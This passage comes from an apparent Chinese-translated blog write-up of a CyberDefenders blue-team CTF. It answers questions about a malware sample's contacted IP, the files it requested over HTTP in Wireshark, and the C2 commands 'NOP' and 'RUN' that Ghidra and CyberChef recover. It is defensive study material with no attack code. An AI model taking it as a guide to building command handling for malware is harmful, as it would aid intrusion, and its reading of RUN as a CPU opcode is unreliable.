translated">15.恶意软件联系的一个IP地址以17开头。提供完整的IP。</p></blockquote><p id="eccf" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我们可以回头参考“<em class="kx">文件&gt;导出对象&gt; HTTP </em>”，在这里我们可以看到恶意软件用来下载BMP文件的以<strong class="kb ir"> 17 </strong>开头的IP地址:</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div class="gh gi ot"><img src="../Images/53d2634bb418cd3ae983c110b9c391ba.png" data-original-src="https://miro.medium.com/v2/resize:fit:924/format:webp/1*ErbcsPHniVpKMESRByTsIg.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">恶意软件接触的IP。</figcaption></figure><blockquote class="mi mj mk"><p id="6dd2" class="jz ka kx kb b kc kd ke kf kg kh ki kj ml kl km kn mm kp kq kr mn kt ku kv kw ij bi translated">16.恶意软件从外部服务器请求了多少文件？</p></blockquote><p id="8f8d" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">对malware-1使用字符串实用程序，我可以看到外部服务器的四个IP地址:</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div class="gh gi ou"><img src="../Images/74659eb04a8c8e9608b3ef236381026e.png" data-original-src="https://miro.medium.com/v2/resize:fit:460/format:webp/1*XxBmpo7MYUVs5jJOSZJfkg.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">外部服务器IP地址。</figcaption></figure><p id="7a76" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">在Wireshark中，我总共可以看到十二个HTTP对象，三个恶意软件文件和九个BMP文件。</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi ov"><img src="../Images/9543e95d318a251db9b871aba508a012.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZkCtvQvipKEjSsWXN53Reg.png"/></div></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">恶意软件请求的文件数量。</figcaption></figure><blockquote class="mi mj mk"><p id="5659" class="jz ka kx kb b kc kd ke kf kg kh ki kj ml kl km kn mm kp kq kr mn kt ku kv kw ij bi translated">17.恶意软件从攻击者服务器接收的命令是什么？格式:按字母顺序逗号分隔</p></blockquote><p id="1af1" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">为了回答这个问题，我使用Ghidra对主要的恶意软件文件进行逆向工程，并从查看主要函数开始:</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div class="gh gi ow"><img src="../Images/c9ebe11a9601b07f535d28944c6a2ea5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1370/format:webp/1*hQL8N3MHUoLLXzqK4YqcrQ.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">恶意软件主要功能。</figcaption></figure><p id="c9d3" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">在main函数中，我可以看到几个有趣的函数，比如makeKeys()、requestFile()、decryptMessage()，特别是<strong class="kb ir"> processMessage() </strong>函数。进一步分析processMessage()函数，我可以看到逻辑语句中使用了一些十六进制编码的参数值:</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div class="gh gi ox"><img src="../Images/0150ce9452dd6f0cd37af35c6c4845a7.png" data-original-src="https://miro.medium.com/v2/resize:fit:644/format:webp/1*yklhMf0vanZSbjTcldDaFQ.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">恶意软件processMessage()函数。</figcaption></figure><p id="b471" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">在CyberChef中解码这些值给了我们两个操作码助记符，NOP和RUN:</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div class="gh gi oy"><img src="../Images/233304336ff37cfba473158d7f0419f5.png" data-original-src="https://miro.medium.com/v2/resize:fit:866/format:webp/1*ZARVuZfuBR9EtQ6SpJhCZQ.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">恶意软件命令。</figcaption></figure><p id="615f" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">NOP代表“无操作”，而<strong class="kb ir"> </strong>通常用于<strong class="kb ir">产生执行延迟或在代码存储器</strong>中保留空间。根据可用的指令集，我找不到名为RUN的操作码助记符，但我们可以假设它用于运行与NOP操作码延迟相关的命令。您可以使用下面的链接查看x86指令的完整列表:</p><div class="oa ob gp gr oc od"><a href="https://en.wikipedia.org/wiki/X86_instruction_listings" rel="noopener  ugc nofollow" target="_blank"><div class="oe ab fo"><div class="of ab og cl cj oh"><h2 class="bd ir gy z fp oi fr fs oj fu fw ip bi translated">x86指令列表-维基百科</h2><div class="ok l"><h3 class="bd b gy z fp oi fr fs oj fu fw dk translated">x86指令集是指x86兼容的微处理器支持的指令集。说明…</h3></div><div class="ol l"><p class="bd b dl z fp oi fr fs oj fu fw dk translated">en.wikipedia.org</p></div></div><div class="oz l"><div class="pa l pb pc pd oz pe js od"/></div></div></a></div></div><div class="ab cl ky kz hu la" role="separator"><span class="lb bw bk lc ld le"/><span class="lb bw bk lc ld le"/><span class="lb bw bk lc ld"/></div><div class="ij ik il im in"><h1 id="de21" class="lf lg iq bd lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc bi translated">结束语</h1><p id="8cde" class="pw-post-body-paragraph jz ka iq kb b kc md ke kf kg me ki kj kk mf km kn ko mg kq kr ks mh ku kv kw ij bi translated">我真的很喜欢通过这个CTF工作，并有机会了解更多关于使用Wireshark分析捕获的流量和使用Ghidra反向工程恶意软件样本的信息。谢谢你一直读到最后，继续黑下去😄！</p><div class="oa ob gp gr oc od"><a href="https://cyberdefenders.org/" rel="noopener  ugc nofollow" target="_blank"><div class="oe ab fo"><div class="of ab og cl cj oh"><h2 class="bd ir gy z fp oi fr fs oj fu fw ip bi translated">网络卫士:蓝队CTF挑战</h2><div class="ok l"><h3 class="bd b gy z fp oi fr fs oj fu fw dk translated">网络卫士的想法是在两位联合创始人致力于一个联合项目以培训一支…</h3></div><div class="ol l"><p class="bd b dl z fp oi fr fs oj fu fw dk translated">cyberdefenders.org</p></div></div><div class="oz l"><div class="pf l pb pc pd oz pe js od"/></div></div></a></div></div></div>    
</body>
</html>